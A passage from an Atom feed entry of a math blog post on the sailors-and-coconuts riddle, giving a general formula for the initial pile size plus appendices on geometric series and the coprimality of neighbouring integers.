</span><span class="n">Some</span><span class="w"> </span><span class="n">numbers</span><span class="w"> </span><span class="n">n</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">work</span><span class="o">:</span><span class="w"> </span><span class="m">79</span><span class="w"> </span><span class="m">160</span><span class="w"> </span><span class="m">241</span><span class="w"> </span><span class="m">322</span><span class="w"> </span><span class="m">403</span><span class="w"> </span><span class="m">484</span><span class="w"> </span><span class="m">565</span><span class="w"> </span><span class="m">646</span><span class="w"> </span><span class="m">727</span><span class="w"> </span><span class="m">808</span><span class="w"> </span><span class="m">889</span><span class="w"> </span><span class="m">970</span><span class="w"> </span><span class="m">1051</span><span class="w"> </span><span class="m">1132</span><span class="w"> </span><span class="m">1213</span><span class="w"> </span><span class="m">1294</span><span class="w"> </span><span class="m">1375</span><span class="w"> </span><span class="m">1456</span><span class="w"> </span><span class="m">1537</span><span class="w"> </span><span class="m">1618</span><span class="w"> </span><span class="m">1699</span><span class="w"> </span><span class="m">1780</span><span class="w"> </span><span class="m">1861</span><span class="w"> </span><span class="m">1942</span><span class="w"> </span><span class="m">2023</span></code></pre></figure> <h1 id="summary">Summary</h1> <p>As we found, it is possible to find a general algebraic solution to the coconut and monkey problem described at the beginning. The number of coconuts that were initially collected, for \(k\) sailors and \(m\) monkeys, is given by:</p> \[\begin{align} n = q \cdot k^{k+1} - m(k -1), \end{align}\] <p>where \(q\) is a natural number larger than 0, since there are infinitely many solutions.</p> <h1 id="appendix">Appendix</h1> <h2 id="geometric-series">Geometric Series</h2> <p>In this appendix we briefly mention several properties of the geometric series which are required for the derivations in other dependencies. For \(q \neq 1\) and \(j&lt;N\) the geometric series can be derived as:</p> \[\begin{equation} \begin{split} S = q^{j}+q^{j+1}+ \cdots + q^{N-1} \\ qS = q^{j+1} + q^{j+2} + \cdots + q^N \\ qS - S = q^N - q^j \\ S(q-1) = q^N - q^j \\ S = \frac{q^N - q^j}{q-1} = \frac{q^j-q^N}{1-q} \end{split} \label{eq:geometricSeries1} \end{equation}\] <p>More generally, the geometric series can be written as:</p> \[\begin{equation} \begin{split} a_0 \sum_{i=j}^{N-1} {q^i} = a_0 \frac{q^N - q^j}{q-1} \end{split} \label{eq:geometricSeries2} \end{equation}\] <p><strong>Special cases</strong></p> <p>If the series starts with \(i=0\) we retrieve:</p> \[\begin{equation} \begin{split} a_0 \sum_{i=0}^{N-1} {q^i} = a_0 \frac{1- q^N}{1-q} \end{split} \label{eq:geometricSeries2a} \end{equation}\] <p>For \(q=1\) we obtain: \begin{equation} \begin{split} a_0 \sum_{i=j}^{N-1} {1^i} = a_0 (N-j) \end{split} \label{eq:geometricSeries3} \end{equation} For an infinite series with \(N=\infty\), convergence is achieved for values \(|q|&lt;1\): \begin{equation} \begin{split} a_0 \sum_{i=j}^{\infty} {q^i} = a_0 \frac{q^j}{1-q} \end{split} \label{eq:geometricSeries4} \end{equation}</p> <h2 id="powers-of-neighbored-natural-numbers-are-relatively-prime">Powers of neighbored natural numbers are relatively prime</h2> <p>In this appendix we briefly show that two neighbored natural numbers \(k\) and \(k+1\) are relatively prime, as well as their powers. This can be done with a proof by contradiction: Let us assume that there exists a divisor \(t&gt;1\) for which:</p> \[\begin{align} k &amp;= q \cdot t\\ k+1 &amp;= r \cdot t \end{align}\] <p>This also implies: \(\begin{align} r &gt; q \\ r - q \geq 1 \end{align}\)</p> <p>We can also write:</p> \[\begin{align} q \cdot t + 1 &amp;= r \cdot t \\ 1 &amp;= r \cdot t - q \cdot t \\ 1 &amp;= (r- q) \cdot t \\ &amp; \Rightarrow r - q = 1 \wedge t = 1. \end{align}\] <p>Since we required \(t&gt;1\), we have a contradiction, which means that the two neighbored numbers \(k\) and \(k+1\) are relatively prime and a fraction containing these two numbers in the numerator and denominator cannot be reduced. Furthermore, since the prime factorization of \(k\) and \(k+1\) returns two disjoint sets of primes \(P_{k}\) and \(P_{k+1}\) (\(P_{k} \cap P_{k+1} = \emptyset\)), it can also be trivially shown that the powers \(k^i\) and \((k+1)^j\), with \(i,j \in \mathbb{N_+}\) are also relatively prime.</p>]]></content><author><name></name></author><category term="math"/><category term="riddles"/><summary type="html"><![CDATA[Three sailors and a monkey are stranded on a deserted island. They gather a pile of coconuts to divide the next morning. During the night, each sailor wakes up, divides the pile into three parts, gives the extra coconut to the monkey, hides his share, and restacks the remaining coconuts. In the morning, the remaining coconuts are again divided into three parts, with one coconut left over, which is given to the monkey. The question is: how many coconuts were originally in the pile?]]></summary></entry></feed>